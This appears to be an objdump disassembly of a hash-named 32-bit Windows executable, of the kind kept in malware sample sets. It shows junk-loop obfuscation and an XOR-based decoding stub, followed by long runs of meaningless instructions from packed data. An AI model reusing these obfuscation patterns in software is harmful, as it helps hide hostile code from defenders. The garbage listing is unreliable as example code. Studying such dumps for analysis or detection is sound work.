
39f3d52fb102a93f43450d0858adf6dfc63252a01d41ef6543684387c94993f6.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x50
  401006:	mov    DWORD PTR [ebp-0x28],0xce941f81
  40100d:	mov    DWORD PTR ds:0x4267c0,0x1b
  401017:	cmp    DWORD PTR ds:0x4267c0,0x0
  40101e:	je     0x401070
  401024:	cmp    DWORD PTR ds:0x4267c0,0x8
  40102b:	jge    0x401070
  401031:	jmp    0x401044
  401036:	push   DWORD PTR [ebp-0xc]
  401039:	push   0x426059
  40103e:	call   DWORD PTR ds:0x4257b0
  401044:	cmp    DWORD PTR ds:0x4267c0,0x9
  40104b:	jne    0x40105e
  401051:	mov    ecx,DWORD PTR ds:0x4267c0
  401057:	dec    ecx
  401058:	mov    DWORD PTR ds:0x4267c0,ecx
  40105e:	mov    ecx,DWORD PTR ds:0x4267c0
  401064:	dec    ecx
  401065:	mov    DWORD PTR ds:0x4267c0,ecx
  40106b:	jmp    0x401017
  401070:	push   ebx
  401071:	push   esi
  401072:	push   edi
  401073:	mov    edi,0xffff2df0
  401078:	mov    ecx,DWORD PTR ds:0x426870
  40107e:	xor    edx,edx
  401080:	or     edx,DWORD PTR ds:0x4268c4
  401086:	sub    ecx,edx
  401088:	or     ecx,DWORD PTR [ecx+edx*1]
  40108b:	mov    DWORD PTR [ebp-0x24],edi
  40108e:	lea    eax,[ebp-0x28]
  401091:	mov    DWORD PTR [ebp-0x4],eax
  401094:	sbb    DWORD PTR ds:0x426828,edi
  40109a:	mov    ecx,DWORD PTR [ebp-0x28]
  40109d:	mov    edx,DWORD PTR [ebp-0x24]
  4010a0:	and    DWORD PTR ds:0x426818,0x0
  4010aa:	mov    eax,ds:0x426818
  4010af:	inc    eax
  4010b0:	mov    ds:0x426818,eax
  4010b5:	cmp    DWORD PTR ds:0x426818,0x26
  4010bc:	ja     0x4010df
  4010c2:	jmp    0x4010d2
  4010c7:	push   0x4378
  4010cc:	call   DWORD PTR ds:0x4257b4
  4010d2:	cmp    DWORD PTR ds:0x426818,0x1d
  4010d9:	jb     0x4010aa
  4010df:	mov    ebx,DWORD PTR [ebp-0x4]
  4010e2:	sbb    esi,DWORD PTR ds:0x4267c8
  4010e8:	xor    edx,0x856a
  4010ee:	or     eax,eax
  4010f0:	mov    eax,0x6729a14b
  4010f5:	and    DWORD PTR ds:0x4267d4,0x0
  4010ff:	mov    esi,DWORD PTR ds:0x4267d4
  401105:	inc    esi
  401106:	mov    DWORD PTR ds:0x4267d4,esi
  40110c:	cmp    DWORD PTR ds:0x4267d4,0x6
  401113:	ja     0x40115d
  401119:	jmp    0x401136
  40111e:	push   0x426838
  401123:	push   0x6c9f
  401128:	push   DWORD PTR [ebp-0xc]
  40112b:	push   0x2ee6
  401130:	call   DWORD PTR ds:0x425780
  401136:	cmp    DWORD PTR ds:0x4267d4,0x5
  40113d:	jne    0x401150
  401143:	mov    esi,DWORD PTR ds:0x4267d4
  401149:	inc    esi
  40114a:	mov    DWORD PTR ds:0x4267d4,esi
  401150:	cmp    DWORD PTR ds:0x4267d4,0x1d
  401157:	jb     0x4010ff
  40115d:	xor    ecx,eax
  40115f:	mov    esi,0x56424137
  401164:	add    ecx,esi
  401166:	mov    DWORD PTR [ebx],ecx
  401168:	mov    ecx,0x5e9a
  40116d:	adc    edx,0x5765
  401173:	mov    DWORD PTR [ebx+0x4],edx
  401176:	mov    DWORD PTR [ebp-0x20],0xce941f82
  40117d:	movzx  ecx,WORD PTR ds:0x42681c
  401184:	sub    DWORD PTR ds:0x426820,ecx
  40118a:	mov    DWORD PTR [ebp-0x1c],edi
  40118d:	or     DWORD PTR ds:0x4267cc,edi
  401193:	mov    DWORD PTR [ebp-0x30],0xce941f81
  40119a:	sub    DWORD PTR ds:0x4267e8,0x5633
  4011a4:	mov    DWORD PTR [ebp-0x2c],edi
  4011a7:	mov    edx,DWORD PTR [ebp+0x8]
  4011aa:	sbb    DWORD PTR ds:0x4267f0,edi
  4011b0:	mov    ecx,0x8a9a
  4011b5:	xor    cx,WORD PTR [edx+0x20]
  4011b9:	inc    edx
  4011ba:	mov    edx,0x3b61
  4011bf:	or     DWORD PTR ds:0x4267bc,0x538d
  4011c9:	add    cx,dx
  4011cc:	movzx  ecx,cx
  4011cf:	xor    DWORD PTR ds:0x42682c,ebx
  4011d5:	mov    DWORD PTR [ebp-0x8],ecx
  4011d8:	mov    ecx,DWORD PTR [ebp-0x20]
  4011db:	mov    DWORD PTR ds:0x426814,0x13
  4011e5:	cmp    DWORD PTR ds:0x426814,0x0
  4011ec:	je     0x401245
  4011f2:	cmp    DWORD PTR ds:0x426814,0x5
  4011f9:	jbe    0x401245
  4011ff:	jmp    0x401217
  401204:	push   DWORD PTR [ebp-0x10]
  401207:	push   0x1d67
  40120c:	push   0x606a
  401211:	call   DWORD PTR ds:0x425784
  401217:	cmp    DWORD PTR ds:0x426814,0x6
  40121e:	jne    0x401231
  401224:	mov    edx,DWORD PTR ds:0x426814
  40122a:	dec    edx
  40122b:	mov    DWORD PTR ds:0x426814,edx
  401231:	xor    edx,edx
  401233:	xor    edx,DWORD PTR ds:0x426814
  401239:	dec    edx
  40123a:	mov    DWORD PTR ds:0x426814,edx
  401240:	jmp    0x4011e5
  401245:	mov    edx,DWORD PTR [ebp-0x1c]
  401248:	xor    ecx,eax
  40124a:	or     DWORD PTR ds:0x4267fc,0x40b0
  401254:	add    ecx,esi
  401256:	mov    DWORD PTR ds:0x4267e8,0x1067
  401260:	jmp    0x40127f
  401265:	mov    ebx,0x67ba
  40126a:	mov    edx,DWORD PTR [ebp-0x28]
  40126d:	mov    ebx,DWORD PTR [ebp-0x24]
  401270:	mov    BYTE PTR [ebp+ecx*1-0x50],dl
  401274:	mov    DWORD PTR ds:0x4267b4,0x6665
  40127e:	inc    ecx
  40127f:	mov    DWORD PTR ds:0x426834,0x31e2
  401289:	cmp    ecx,0x20
  40128c:	mov    DWORD PTR ds:0x4267c4,0x2cd5
  401296:	jb     0x401265
  40129c:	mov    ecx,DWORD PTR [ebp-0x20]
  40129f:	add    DWORD PTR ds:0x4267c8,0x4267d4
  4012a9:	mov    edx,DWORD PTR [ebp-0x1c]
  4012ac:	adc    DWORD PTR ds:0x426838,0x1ede
  4012b6:	xor    ecx,eax
  4012b8:	or     DWORD PTR ds:0x426854,0x6993
  4012c2:	add    ecx,esi
  4012c4:	jmp    0x4036a1
  4012c9:	add    DWORD PTR ds:0x426848,ecx
  4012cf:	mov    ebx,DWORD PTR [ebp+0x8]
  4012d2:	not    edx
  4012d4:	mov    edx,0x8a9a
  4012d9:	add    DWORD PTR ds:0x426850,0x426848
  4012e3:	xor    dx,WORD PTR [ebx+ecx*4+0x2]
  4012e8:	sub    ebx,DWORD PTR ds:0x426830
  4012ee:	mov    ebx,0x3b61
  4012f3:	add    dx,bx
  4012f6:	movzx  edx,dx
  4012f9:	mov    DWORD PTR [ebp-0x14],edx
  4012fc:	mov    edx,DWORD PTR [ebp+0x8]
  4012ff:	movzx  ecx,WORD PTR [edx+ecx*4]
  401303:	mov    edx,DWORD PTR [ebp-0x14]
  401306:	xor    ecx,0x8a9a
  40130c:	add    ecx,ebx
  40130e:	mov    BYTE PTR [ebp+edx*1-0x50],cl
  401312:	jmp    0x40369d
  401317:	mov    ds:0x64352564,eax
  40131c:	je     0x4012d1
  40131e:	je     0x401306
  401320:	leave  
  401321:	imul   edi,DWORD PTR [esi+0x33fb07b6],0x7b
  401328:	jnp    0x4013a5
  40132a:	jnp    0x401311
  40132c:	cwde   
  40132d:	jnp    0x4013aa
  40132f:	ror    cl,cl
  401331:	sar    BYTE PTR [esi-0x372b3d2a],1
  401337:	add    cl,0x86
  40133a:	xchg   DWORD PTR [edi],esp
  40133c:	mov    cs,WORD PTR [edx+0x22b38a8b]
  401342:	sbb    esi,edi
  401344:	lea    esp,[ebp+0x4d947e84]
  40134a:	jge    0x4012d6
  40134c:	xchg   esi,eax
  40134d:	sub    BYTE PTR [edx-0x4964255],bl
  401353:	pusha  
  401354:	ja     0x4012e6
  401356:	stos   BYTE PTR es:[edi],al
  401357:	js     0x401309
  401359:	ins    DWORD PTR es:[edi],dx
  40135a:	inc    edi
  40135b:	js     0x40139a
  40135d:	inc    ebx
  40135e:	mov    ah,0xc9
  401360:	clc    
  401361:	xchg   DWORD PTR [ecx],ebx
  401363:	sti    
  401364:	mov    WORD PTR [eax-0x21],?
  401367:	or     dh,BYTE PTR [esi+0x600a3b2a]
  40136d:	int3   
  40136e:	pop    ds
  40136f:	fs (bad) 
  401371:	call   0x21ab580c
  401376:	lock mov bl,BYTE PTR [edx]
  401379:	loope  0x40138c
  40137b:	out    dx,eax
  40137c:	sti    
  40137d:	(bad)  
  40137e:	aad    0xa5
  401380:	jmp    0x36c5984c
  401385:	dec    eax
  401386:	int3   
  401387:	sahf   
  401388:	loop   0x4013d1
  40138a:	clc    
  40138b:	push   es
  40138c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40138d:	les    esi,FWORD PTR [ecx-0x4d]
  401390:	and    eax,0xfbdbf694
  401395:	jne    0x4013d5
  401397:	jl     0x4013b3
  401399:	push   ebp
  40139a:	cwde   
  40139b:	fs ds loopne 0x401370
  40139f:	arpl   WORD PTR [esi+0x73b95fec],bp
  4013a5:	ins    BYTE PTR es:[edi],dx
  4013a6:	in     al,0x1b
  4013a8:	retf   0x6a93
  4013ab:	mov    cl,0xac
  4013ad:	xchg   ecx,eax
  4013ae:	cld    
  4013af:	sub    BYTE PTR [ebx-0x3a],ch
  4013b2:	sub    ax,0x2930
  4013b6:	mov    es,WORD PTR gs:[ecx]
  4013b9:	mov    ds:0xbfe9a993,al
  4013be:	in     al,dx
  4013bf:	mov    bh,0xdc
  4013c1:	dec    edx
  4013c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4013c3:	sub    eax,DWORD PTR [eax-0x53]
  4013c6:	sbb    eax,0x93fa97e1
  4013cb:	xchg   edi,eax
  4013cc:	inc    edx
  4013cd:	test   BYTE PTR [ebp-0x235c0ac8],0x4d
  4013d4:	stos   BYTE PTR es:[edi],al
  4013d5:	push   edi
  4013d6:	xchg   esp,eax
  4013d7:	jo     0x401389
  4013d9:	mov    ds:0x4f68dec2,al
  4013de:	fs jmp 0x2a8e1535
  4013e4:	dec    ecx
  4013e5:	add    cl,BYTE PTR [edi]
  4013e7:	test   DWORD PTR [eax+ecx*8],edi
  4013ea:	cmp    al,0xdf
  4013ec:	inc    esi
  4013ed:	imul   ecx,DWORD PTR [eax+0x1dd5939b],0xfffffffb
  4013f4:	xchg   edx,eax
  4013f5:	or     eax,0x79bd1d96
  4013fa:	daa    
  4013fb:	mov    edx,0xcceed915
  401400:	mov    dh,0x3f
  401402:	ja     0x4013af
  401404:	in     eax,0x57
  401406:	pop    esi
  401407:	or     DWORD PTR [edx],edx
  401409:	fidivr DWORD PTR [esi+ecx*8-0x66]
  40140d:	add    BYTE PTR [ebx-0x2f],al
  401410:	or     al,0x50
  401412:	ja     0x4013ec
  401414:	ja     0x40143f
  401416:	and    BYTE PTR [ebx],al
  401418:	push   0xf88fc553
  40141d:	ret    
  40141e:	sti    
  40141f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401420:	lds    edi,FWORD PTR [ecx]
  401422:	pop    ss
  401423:	inc    edx
  401424:	mov    dh,0x6e
  401426:	add    DWORD PTR ss:[esi],0x24
  40142a:	lahf   
  40142b:	xor    ch,BYTE PTR [ecx]
  40142d:	pusha  
  40142e:	jmp    0x401402
  401430:	cmp    ecx,esp
  401432:	or     bl,cl
  401434:	adc    DWORD PTR [edx-0x63],ebx
  401437:	push   0x9dd25c2
  40143c:	push   es
  40143d:	or     BYTE PTR [ebx-0x60],al
  401440:	int    0x10
  401442:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401443:	out    0x97,eax
  401445:	jmp    0x8c3c1437
  40144a:	add    ecx,DWORD PTR [ebp-0x6e]
  40144d:	fwait
  40144e:	imul   eax,DWORD PTR [edx+0x1527b19],0x1824c249
  401458:	xchg   esp,eax
  401459:	enter  0xb01a,0xb5
  40145d:	std    
  40145e:	mov    ebp,DWORD PTR [edi-0x50]
  401461:	pop    eax
  401462:	xlat   BYTE PTR ds:[ebx]
  401463:	xlat   BYTE PTR es:[ebx]
  401465:	enter  0x6519,0x2
  401469:	add    BYTE PTR [eax-0x7b5fdeff],0x5e
  401470:	dec    DWORD PTR [edi-0x47e73343]
  401476:	jno    0x4014a4
  401478:	je     0x4014e2
  40147a:	fisttp DWORD PTR [ecx]
  40147c:	sbb    ch,BYTE PTR [esi+0x257d07ca]
  401482:	mov    bh,0xb7
  401484:	(bad)
  401487:	pop    eax
  401488:	xchg   ecx,eax
  401489:	inc    edi
  40148a:	out    dx,al
  40148b:	xor    eax,0x2430d84a
  401490:	sub    esi,DWORD PTR [ebp+0x6af2c419]
  401496:	fwait
  401497:	jecxz  0x40141f
  401499:	aaa    
  40149a:	mov    ax,0xab95
  40149e:	cdq    
  40149f:	jne    0x401491
  4014a1:	or     dl,al
  4014a3:	fidiv  WORD PTR [esi+0x0]
  4014a6:	adc    BYTE PTR [edi+0x62],dl
  4014a9:	out    0x4e,al
  4014ab:	sbb    ch,ah
  4014ad:	pop    esi
  4014ae:	add    DWORD PTR [eax-0x53cffa2f],ebx
  4014b4:	inc    eax
  4014b5:	pop    ebx
  4014b6:	hlt    
  4014b7:	pop    es
  4014b8:	xlat   BYTE PTR ds:[ebx]
  4014b9:	cdq    
  4014ba:	gs dec esp
  4014bc:	inc    ebp
  4014bd:	or     DWORD PTR [ebx+0x4d],esi
  4014c0:	dec    esi
  4014c1:	std    
  4014c2:	or     ah,BYTE PTR [edx]
  4014c4:	mov    BYTE PTR [ebx+0x47afb0fd],bh
  4014ca:	add    esp,DWORD PTR [ecx]
  4014cc:	xor    DWORD PTR [ebx],esi
  4014ce:	sbb    esp,edx
  4014d0:	adc    esp,DWORD PTR [eax+ecx*1-0xc54392b]
  4014d7:	jmp    0x96cc:0xdb9ce7c5
  4014de:	push   esp
  4014df:	cwde   
  4014e0:	clc    
  4014e1:	in     al,dx
  4014e2:	mov    dh,0xfa
  4014e4:	mov    ecx,0xc4565ff2
  4014e9:	xchg   ecx,eax
  4014ea:	repnz pop ecx
  4014ec:	jnp    0x4014e8
  4014ee:	xor    dl,BYTE PTR [eax]
  4014f0:	add    al,0x39
  4014f2:	sub    eax,0x7c1232b4
  4014f7:	inc    esp
  4014f8:	test   edx,eax
  4014fa:	jmp    FWORD PTR [ecx+0x680fcdeb]
  401500:	xor    eax,0x41fb059d
  401505:	call   0xa71e:0xa39bd625
  40150c:	fild   WORD PTR [eax-0x47]
  40150f:	sar    BYTE PTR [edi],0x7f
  401512:	push   esp
  401513:	cld    
  401514:	enter  0x2278,0x85
  401518:	leave  
  401519:	add    eax,0x89fe1de2
  40151e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40151f:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401521:	mov    eax,ds:0xea27bdfb
  401526:	jbe    0x4014b0
  401528:	adc    DWORD PTR [esi-0x241fd815],0xffffff8a
  40152f:	ins    BYTE PTR es:[edi],dx
  401530:	rcr    DWORD PTR [eax],1
  401532:	cmc    
  401533:	pop    ds
  401534:	jae    0x401586
  401536:	adc    BYTE PTR [ebx+0x2],bl
  401539:	mov    ds:0x44dd116,al
  40153e:	mov    dh,dl
  401540:	or     ch,BYTE PTR [edx+0x1e]
  401543:	jge    0x4015b4
  401545:	pop    es
  401546:	(bad)  
  401547:	in     eax,dx
  401548:	stos   BYTE PTR es:[edi],al
  401549:	scas   al,BYTE PTR es:[edi]
  40154a:	in     al,dx
  40154b:	cmp    DWORD PTR [edi],esp
  40154d:	push   edi
  40154e:	and    bh,0xcb
  401551:	mov    ds:0x1eb61df5,al
  401556:	or     ebx,DWORD PTR [ecx-0x67]
  401559:	int    0x58
  40155b:	fninit 
  40155d:	cmp    BYTE PTR [edx+0x7f058081],ch
  401563:	adc    eax,0x7ec315f2
  401568:	pushf  
  401569:	fwait
  40156a:	cmp    eax,eax
  40156c:	push   ss
  40156d:	and    cl,BYTE PTR [ebx-0x52822a7]
  401573:	inc    ebx
  401574:	sbb    DWORD PTR [esi-0x5e],esp
  401577:	pop    ecx
  401578:	cdq    
  401579:	loope  0x40152b
  40157b:	pop    ebp
  40157c:	xor    BYTE PTR [eax],al
  40157e:	fdivr  DWORD PTR [eiz*2+0xb96b056]
  401585:	mov    esi,0x3809cd04
  40158a:	and    BYTE PTR [eax],0x4a
  40158d:	mov    cl,0x80
  40158f:	clc    
  401590:	xor    ecx,edx
  401592:	and    BYTE PTR [ebx-0x2e],dl
  401595:	shl    BYTE PTR [ebx+0x68],1
  401598:	xchg   edi,eax
  401599:	stos   BYTE PTR es:[edi],al
  40159a:	sub    ebp,DWORD PTR [ecx-0x61afbec]
  4015a0:	mov    al,ds:0xfacf7b4c
  4015a5:	push   esp
  4015a6:	cli    
  4015a7:	das    
  4015a8:	cld    
  4015a9:	ss push esi
  4015ab:	ror    BYTE PTR [ebp-0x7ef357c2],cl
  4015b1:	xchg   edx,eax
  4015b2:	inc    edx
  4015b3:	nop
  4015b4:	mov    ebx,0xd695493d
  4015b9:	in     eax,dx
  4015ba:	add    DWORD PTR [esi+0x1d],edi
  4015bd:	daa    
  4015be:	adc    DWORD PTR [edi-0x2a8f1147],0x4c89d500
  4015c8:	push   0x5c
  4015ca:	aaa    
  4015cb:	mov    bl,0xe4
  4015cd:	jecxz  0x401562
  4015cf:	lock xchg DWORD PTR [ecx+eiz*2+0x4e873d37],eax
  4015d7:	jmp    0x3ce6faa7
  4015dc:	leave  
  4015dd:	rcl    BYTE PTR [ebx],cl
  4015df:	std    
  4015e0:	iret   
  4015e1:	push   ds
  4015e2:	inc    ebp
  4015e3:	scas   eax,DWORD PTR es:[edi]
  4015e4:	sbb    al,BYTE PTR [esi]
  4015e6:	test   DWORD PTR [edi],edi
  4015e8:	out    dx,al
  4015e9:	xchg   esi,eax
  4015ea:	test   eax,0x22ba8456
  4015ef:	mov    al,ds:0x1aaf6ff6
  4015f4:	mov    al,ds:0xa4523f94
  4015f9:	call   0x25f109ae
  4015fe:	mov    dl,0x3
  401600:	(bad)  
  401601:	jmp    0x70096202
  401606:	shl    BYTE PTR [edx+0x3f],1
  401609:	mov    edi,0x8c556863
  40160e:	lods   al,BYTE PTR ds:[esi]
  40160f:	mov    al,0x96
  401611:	xchg   edx,eax
  401612:	mov    ds:0xeb26f31,eax
  401617:	xor    DWORD PTR [eax+edx*4],ebp
  40161a:	push   ebx
  40161b:	jmp    0x401681
  40161d:	sub    eax,0x49fa22e5
  401622:	es and al,0xba
  401625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401626:	inc    eax
  401627:	loopne 0x401646
  401629:	jecxz  0x4016a6
  40162b:	fidiv  WORD PTR [edx+eiz*2-0xa]
  40162f:	push   edi
  401630:	in     eax,dx
  401631:	mov    DWORD PTR [ecx+esi*1-0x75a1b7c9],esp
  401638:	mov    esi,0xbbc19fa0
  40163d:	cld    
  40163e:	add    ch,BYTE PTR [esi+0x6e2c162f]
  401644:	and    ebx,DWORD PTR [ecx+eax*4-0x3e17a16c]
  40164b:	adc    bl,BYTE PTR [esi+0x1e]
  40164e:	mov    DWORD PTR [edx+0x1f1f3475],0x4d740b5c
  401658:	or     BYTE PTR [ecx+0x6cbb09e5],bh
  40165e:	cmp    DWORD PTR [ecx+0x7],ecx
  401661:	fsub   st,st(5)
  401663:	test   DWORD PTR [edx],ebp
  401665:	xor    BYTE PTR [ecx+0x1a2fe76e],ah
  40166b:	ds xor al,0xc1
  40166e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40166f:	mov    edx,0x9047ea4a
  401674:	cld    
  401675:	dec    eax
  401676:	push   bp
  401678:	and    eax,DWORD PTR [esi+0x22]
  40167b:	xor    esi,DWORD PTR [ecx+0x11]
  40167e:	mov    cl,BYTE PTR [ebx]
  401680:	sbb    ebx,DWORD PTR [edx]
  401682:	fiadd  WORD PTR es:[edx-0x6e88e18c]
  401689:	in     eax,0xc3
  40168b:	lahf   
  40168c:	add    dh,ch
  40168e:	es pop ss
  401690:	inc    ebx
  401691:	dec    esi
  401692:	repnz push eax
  401694:	sbb    al,BYTE PTR [ecx+0x65]
  401697:	sbb    ecx,DWORD PTR [ebx+ebp*8-0x3c]
  40169b:	out    0x7b,al
  40169d:	enter  0x7ef0,0x3
  4016a1:	sub    eax,0xc73f0617
  4016a6:	pop    ebx
  4016a7:	(bad)  
  4016a8:	jno    0x401657
  4016aa:	jne    0x40163f
  4016ac:	sub    DWORD PTR [edi],edi
  4016ae:	jae    0x40169c
  4016b0:	adc    al,0xfe
  4016b2:	setl   BYTE PTR [ebx]
  4016b5:	adc    al,0x6f
  4016b7:	psrlq  mm2,QWORD PTR [eax+0x3a808eb3]
  4016be:	cmp    dl,BYTE PTR [eax]
  4016c0:	int3   
  4016c1:	mov    ebp,0x6531f095
  4016c6:	jnp    0x401691
  4016c8:	aas    
  4016c9:	mov    edi,fs
  4016cb:	loope  0x4016ad
  4016cd:	lahf   
  4016ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4016cf:	push   ebx
  4016d0:	inc    ebx
  4016d1:	frstor [edi-0x12]
  4016d4:	sbb    al,0xfd
  4016d6:	fistp  DWORD PTR [edx]
  4016d8:	out    dx,eax
  4016d9:	lock shl DWORD PTR [edx-0x6a],cl
  4016dd:	sub    al,0xba
  4016e0:	enter  0x1b98,0x71
  4016e4:	sahf   
  4016e5:	and    BYTE PTR [ebx+eax*8-0x50],bh
  4016e9:	cwde   
  4016ea:	dec    edi
  4016eb:	sbb    eax,0x28de9b13
  4016f0:	fst    DWORD PTR [ecx-0x29cacd08]
  4016f6:	mov    edx,0x1e1bc86d
  4016fb:	loop   0x401691
  4016fd:	mov    eax,ds:0xeb3710f8
  401702:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401703:	gs mov esi,0xbce0a99e
  401709:	cmp    edi,DWORD PTR [ebx+ecx*8-0x6f]
  40170d:	(bad)  
  40170e:	repnz sub dh,al
  401711:	cmp    edx,ecx
  401713:	(bad)  
  401714:	aam    0x12
  401716:	imul   edx,DWORD PTR [edi],0x7d
  401719:	lahf   
  40171a:	or     bh,cl
  40171c:	inc    ebx
  40171d:	int3   
  40171e:	out    dx,eax
  40171f:	addr16 cmp eax,0x8d695a77
  401725:	add    eax,0x51074b8b
  40172a:	push   edx
  40172b:	push   edi
  40172c:	mov    esp,0x8f8b8670
  401731:	jbe    0x4016be
  401733:	ror    ecx,1
  401735:	mov    ch,0xdd
  401737:	icebp  
  401738:	dec    ebp
  401739:	dec    esi
  40173a:	jbe    0x4016bc
  40173c:	pushf  
  40173d:	outs   dx,BYTE PTR ds:[esi]
  40173e:	xor    al,0xd7
  401740:	loope  0x401796
  401742:	dec    edi
  401743:	es icebp 
  401745:	addr16 aas 
  401747:	repz push es
  401749:	mov    BYTE PTR [edx+esi*4-0x5],0x2a
  40174e:	add    ecx,DWORD PTR [ebx-0x2c0acbae]
  401754:	ret    0x32c6
  401757:	jne    0x401774
  401759:	pop    esp
  40175a:	shl    DWORD PTR [edx+0x2844e91a],0xe2
  401761:	xchg   esi,eax
  401762:	xchg   DWORD PTR [eax+0x79],esi
  401765:	fld    TBYTE PTR [ebx-0x6c]
  401768:	adc    DWORD PTR [ebx-0x7f],0xffffffa9
  40176c:	pop    esp
  40176d:	mov    ds:0x6d5c1f0d,al
  401772:	into   
  401773:	jo     0x4017b4
  401775:	cmp    ch,dl
  401777:	(bad)  [esi+0x6e]
  40177a:	fld    TBYTE PTR [edi-0xc]
  40177d:	les    esi,FWORD PTR [eax]
  40177f:	iret   
  401780:	add    eax,0x33413c4b
  401785:	jmp    0xf6988690
  40178a:	aam    0x76
  40178c:	retf   
  40178d:	(bad)  
  40178e:	sub    eax,0xb797c67
  401793:	enter  0xde80,0x88
  401797:	ror    BYTE PTR [esp+eiz*2-0x1a1e8945],cl
  40179e:	sub    esi,ebp
  4017a0:	cmp    ebp,DWORD PTR [edi]
  4017a2:	aas    
  4017a3:	out    dx,eax
  4017a4:	inc    esp
  4017a5:	stc    
  4017a6:	mov    ecx,0x4524a887
  4017ab:	stc    
  4017ac:	fisub  DWORD PTR [esi+0x3ba8160d]
  4017b2:	mov    edi,0x570e2cdb
  4017b7:	mov    ah,0x19
  4017b9:	ret    0xccf8
  4017bc:	push   0xffffffe2
  4017be:	popf   
  4017bf:	jge    0x4017b4
  4017c1:	pop    es
  4017c2:	add    dh,BYTE PTR [eax-0x3b]
  4017c5:	jae    0x40178b
  4017c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017c8:	or     al,0xa4
  4017ca:	jle    0x4017a1
  4017cc:	mov    eax,0x2a96e0ff
  4017d1:	or     al,BYTE PTR [esi-0x38216d9e]
  4017d7:	dec    edx
  4017d8:	jge    0x4017e0
  4017da:	js     0x4017f3
  4017dc:	sub    BYTE PTR [eax],bh
  4017de:	push   ds
  4017df:	es mov bl,0x7a
  4017e2:	imul   edx,DWORD PTR [edi],0xd2e81602
  4017e8:	inc    ecx
  4017e9:	push   eax
  4017ea:	movsx  ebp,dh
  4017ed:	adc    dh,0x3a
  4017f0:	xlat   BYTE PTR ds:[ebx]
  4017f1:	aam    0x4e
  4017f3:	push   ds
  4017f4:	push   ebx
  4017f5:	into   
  4017f6:	pop    edi
  4017f7:	xor    eax,0x3a0b5f32
  4017fc:	dec    ebp
  4017fd:	cld    
  4017fe:	repnz aad 0x36
  401801:	pop    ss
  401802:	jno    0x40179d
  401804:	or     al,0x19
  401806:	adc    dh,BYTE PTR [eax]
  401808:	pop    ds
  401809:	gs (bad) 
  40180b:	out    dx,eax
  40180c:	mov    dh,0xc4
  40180e:	xor    al,0xa5
  401810:	inc    esp
  401811:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401812:	fild   DWORD PTR [ebx]
  401814:	dec    ebx
  401815:	fnstsw WORD PTR [esi-0x9]
  401818:	aad    0xf7
  40181a:	sti    
  40181b:	xchg   esp,eax
  40181c:	int    0xaa
  40181e:	add    ah,BYTE PTR [eax-0x44]
  401821:	das    
  401822:	dec    edx
  401823:	inc    ecx
  401824:	cli    
  401825:	dec    edx
  401826:	sbb    eax,0x748eff1
  40182b:	xor    ebp,DWORD PTR [edi-0x3a5433cb]
  401831:	das    
  401832:	mov    ch,0x66
  401834:	in     al,0x8d
  401836:	loope  0x401823
  401838:	js     0x401841
  40183a:	or     ecx,DWORD PTR [ebx-0x7d973685]
  401840:	scas   eax,DWORD PTR es:[edi]
  401841:	inc    ebp
  401842:	jns    0x4017f0
  401844:	sahf   
  401845:	cmp    BYTE PTR [ebx+0x75a64abf],dl
  40184b:	enter  0x380d,0xed
  40184f:	xchg   edx,eax
  401850:	pop    esp
  401851:	repz pushf 
  401853:	int3   
  401854:	nop
  401855:	daa    
  401856:	imul   esp,DWORD PTR [ebp-0x18],0x1c
  40185a:	shl    edx,cl
  40185c:	push   edi
  40185d:	mov    esp,0x7a38dc73
  401862:	mov    eax,0x6cf1d5b0
  401867:	inc    esp
  401868:	or     al,BYTE PTR [ebp+0xb]
  40186b:	push   cs
  40186c:	clc    
  40186d:	lods   eax,DWORD PTR ds:[esi]
  40186e:	inc    esi
  40186f:	sbb    DWORD PTR [ecx-0x4c],edx
  401872:	aaa    
  401873:	xchg   DWORD PTR [ecx],eax
  401875:	dec    esp
  401876:	and    BYTE PTR [edi],bl
  401878:	loop   0x4018ed
  40187a:	aad    0x2f
  40187c:	mov    edi,0x3b5c93a6
  401881:	addr16 mov eax,ds:0x2d73
  401885:	mov    dh,0x1a
  401887:	mov    edx,0x483049f8
  40188c:	arpl   WORD PTR [esi],bp
  40188e:	sub    DWORD PTR [esp+ebp*4],ecx
  401891:	das    
  401892:	icebp  
  401893:	aad    0x21
  401895:	jbe    0x4018d6
  401897:	sub    al,0x54
  401899:	mov    bh,0x28
  40189b:	xor    eax,0x93c5de3e
  4018a0:	push   cs
  4018a1:	inc    edx
  4018a2:	shr    BYTE PTR [edx+0x4f],cl
  4018a5:	add    al,0xcb
  4018a7:	or     DWORD PTR [esi],eax
  4018a9:	scas   al,BYTE PTR es:[edi]
  4018aa:	mov    edx,ecx
  4018ac:	enter  0x59fd,0xd3
  4018b0:	sbb    al,0x21
  4018b2:	stos   DWORD PTR es:[edi],eax
  4018b3:	out    dx,al
  4018b4:	adc    dl,BYTE PTR [ebp+0x53]
  4018b7:	jne    0x401891
  4018b9:	or     al,0xa1
  4018bb:	ret    
  4018bc:	mov    edx,0x9bbcde06
  4018c1:	mov    ds:0x53312e1b,al
  4018c6:	js     0x401916
  4018c8:	mov    BYTE PTR [ecx+0x73b6cdca],dh
  4018ce:	mov    al,0xa
  4018d0:	popf   
  4018d1:	xor    cl,BYTE PTR [edx-0x1976609f]
  4018d7:	rcl    DWORD PTR [edi+edx*1+0x16354d2d],0x1f
  4018df:	call   0xf2d5:0xe1319770
  4018e6:	retf   
  4018e7:	inc    esp
  4018e8:	lock mov ebx,0x22804359
  4018ee:	inc    edx
  4018ef:	enter  0x7526,0x94
  4018f3:	mov    edi,ds
  4018f5:	ret    0x801d
  4018f8:	pushf  
  4018f9:	rcl    BYTE PTR [edx],cl
  4018fb:	stc    
  4018fc:	test   esi,edx
  4018fe:	in     eax,0x47
  401900:	imul   edi,DWORD PTR [esp+ebp*4],0x942e1a1e
  401907:	pop    ebx
